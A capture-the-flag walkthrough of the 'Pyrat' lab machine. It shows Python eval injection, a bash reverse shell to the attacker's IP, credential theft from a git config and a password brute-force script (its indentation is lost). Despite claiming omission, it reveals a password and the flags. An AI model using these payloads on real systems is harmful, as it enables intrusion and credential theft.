## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Test your enumeration skills on this boot-to-root machine.
Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.
```
# IP-Address
```IP
10.49.180.10
```
## Scan
```bash
$ rustscan -a 10.49.180.10 -b 450 -t 2000 --ulimit 5000 -- -e tun0 -Pn -A
Open 10.49.180.10:22
Open 10.49.180.10:8000
8000/tcp open  http-alt syn-ack ttl 62 SimpleHTTP/0.6 Python/3.11.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Unknown favicon MD5: FBD3DB4BEF1D598ED90E26610F23A63F
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop:
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions:
|     invalid syntax (<string>, line 1)
|   GetRequest:
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest:
|     name 'OPTIONS' is not defined
|   Help:
|_    name 'HELP' is not defined
```

## Browser
### 🧠 Service Analysis (Port 8000)
```bash
GET / HTTP/1.1
Host: 10.49.180.10:8000
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

Result
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Date: Mon Apr 06 00:50:14  2026
Content-type: text/html; charset=utf-8
Content-Length: 27
Try a more basic connection!
```

> 💀 Backend is executing input via Python (`eval` or `exec`)
## NetCat
```bash
└─$ nc 10.49.180.10 8000
admin
Password:
```
- Tried Multiple Python execution
```bash
$ nc 10.49.180.10 8000
admin
Password:
__import__('os').popen('id').read()
Password:
[password omitted]
Password:

$ nc 10.49.180.10 8000
' or '1'='1
invalid syntax (<string>, line 1)

$ nc 10.49.180.10 8000
True
1==1
[1]
"admin"
len("a")
if eval(password):
    login_success()unexpected EOF while parsing (<string>, line 1)

$ nc 10.49.180.10 8000
__import__('time').sleep(5)
exit()
quit()
1/0
result = eval(input())
__import__('os').system('id')
__import__('os').system('bash')
__import__('pty').spawn('/bin/bash')
__import__('os').system('id >&0')
```
- Reverse-shell
```bash
$nc 10.49.180.10 8000
__import__('socket').socket().connect(('192.168.157.252',4444))
nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.157.252] from (UNKNOWN) [10.49.180.10] 60804
```
- Got the `Shell`
```bash
$nc 10.49.180.10 8000
__import__('os').system('bash -c "bash -i >& /dev/tcp/192.168.157.252/4444 0>&1"')

$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.157.252] from (UNKNOWN) [10.49.180.10] 59962
bash: cannot set terminal process group (745): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
www-data@ip-10-49-180-10:~$ 
```
### Enumeration as www-data
#### 🔹 Find Interesting Files

```bash
$ find / -name ".git" 2>/dev/null
/opt/dev/.git
$ cd /opt/dev/.git
$ git --git-dir=/opt/dev/.git ls-tree -r HEAD --name-only
pyrat.py.old
$ $ git --git-dir=/opt/dev/.git log --oneline
git --git-dir=/opt/dev/.git log --oneline
WARNING: terminal is not fully functional
-  (press RETURN)
0a3c36d (HEAD -> master) Added shell endpoint

$ git --git-dir=/opt/dev/.git show HEAD
git --git-dir=/opt/dev/.git show HEAD
WARNING: terminal is not fully functional
-  (press RETURN)
warning: unable to access '/root/.config/git/attributes': Permission denied
warning: unable to access '/root/.config/git/attributes': Permission denied
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

diff --git a/pyrat.py.old b/pyrat.py.old
new file mode 100644
index 0000000..ce425cf
--- /dev/null
+++ b/pyrat.py.old
@@ -0,0 +1,27 @@
+...............................................
+
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
:

```
### Credentials
- Config File Contains 
```bash
$ cat config
cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
    	name = Jose Mario
    	email = josemlwdf@github.com

[credential]
    	helper = cache --timeout=3600

[credential "https://github.com"]
    	username = think
    	password = [password omitted]
$

```

```bash
su think 
password: [password omitted]
~$ ls -la
total 40
drwxr-x--- 5 think think 4096 Jun 21  2023 .
drwxr-xr-x 4 root  root  4096 Apr  6 00:28 ..
lrwxrwxrwx 1 root  root     9 Jun 15  2023 .bash_history -> /dev/null
-rwxr-x--- 1 think think  220 Jun  2  2023 .bash_logout
-rwxr-x--- 1 think think 3771 Jun  2  2023 .bashrc
drwxr-x--- 2 think think 4096 Jun  2  2023 .cache
-rwxr-x--- 1 think think   25 Jun 21  2023 .gitconfig
drwx------ 3 think think 4096 Jun 21  2023 .gnupg
-rwxr-x--- 1 think think  807 Jun  2  2023 .profile
drwx------ 3 think think 4096 Jun 21  2023 snap
-rw-r--r-- 1 root  think   33 Jun 15  2023 user.txt
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
think@ip-10-49-180-10:~$ cat user.txt
[flag/hash omitted]
```

## Escalation
```bash
$git --git-dir=/opt/dev/.git show HEAD:pyrat.py.old
if data == 'shell':
    shell(client_socket)
else:
    exec_python(client_socket, data)
```
- Confirms:
	- `shell` → interactive shell
	- everything else → Python execution

## Admin Login Discovery
```bash
nc 10.49.180.10 8000
admin
Password:
```
- Python Script - Password fuzzing
```python 
import socket  
target_ip = "10.49.180.10" # Target IP  
target_port = 8000 # Target port  
password_wordlist = "/usr/share/wordlists/rockyou.txt" # Path to the password wordlist file  
  
def connect_and_send_password(password):  
try:  
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
client_socket.connect((target_ip, target_port))  
client_socket.sendall(b'admin\n')  
  
response = client_socket.recv(1024).decode()  
print(f"Server response after sending 'admin': {response}")  
  
if "Password:" in response:  
print(f"Trying password: {password}")  
client_socket.sendall(password.encode() + b"\n")  
  
response = client_socket.recv(1024).decode()  
  
if "success" in response.lower() or "admin" in response.lower():  
print(f"Server response for password '{password}': {response}")  
return True  
else:  
print(f"Password '{password}' is incorrect or no response.")  
  
return False  
  
except Exception as e:  
print(f"Error: {e}")  
return False  
  
finally:  
client_socket.close()  
  
def fuzz_passwords():  
with open(password_wordlist, "r", encoding="latin-1") as file: # Updated to use encoding="latin-1"  
passwords = file.readlines()  
  
for password in passwords:  
password = password.strip() # Remove any newline characters  
  
if connect_and_send_password(password):  
print(f"Correct password found: {password}")  
break  
else:  
print(f"Password {password} was incorrect. Reconnecting...")  
  
if __name__ == "__main__":  
fuzz_passwords()
```
- Username - admin
- Password - `abc123`
### Login
```bash
nc 10.49.180.10 8000
admin
Password:
[password omitted]
shell
# Whoami 
root
# cat /root/root.txt
[flag/hash omitted]
```

## Flag
```Flag
User - 996bdb1f619a68361417cabca5454705
Root - ba5ed03e9e74bb98054438480165e221
```
# END